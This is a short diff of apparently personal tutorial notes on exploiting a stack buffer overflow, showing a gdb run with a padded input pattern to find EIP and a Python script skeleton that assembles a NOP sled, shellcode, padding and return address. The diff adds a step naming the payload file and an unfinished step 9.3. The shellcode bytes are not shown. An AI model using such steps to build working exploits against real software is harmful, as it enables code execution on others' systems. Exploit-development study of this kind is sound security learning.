@@ -72,7 +72,9 @@ run $(python2.7 -c "print('A'*352 + 'B' * 4 + 'Z'*144)")
 /note the EIP address is 4 bytes
 
 //Step 9 making the actual payload and NOP sled
-/Step 9.1 make a .py file using Nano
+/Step 9.1 make a .py file using Nano:
+nano pieshell.py
+/note the name is completely arbitrary and is completely up to you
 /Step 9.2 Copy+paste the following code into it:
 ---
 #!/usr/bin/python 
@@ -89,6 +91,8 @@ eip = '1234'
 print nopsled + shellcode + padding + eip + paddingZ
 ---
 /PLEASE NOTE THAT THE EXAMPLE SHELLCODE IS 32 BYTES!
+
+/Step 9.3 run the vulnerable application using your
 
 
 
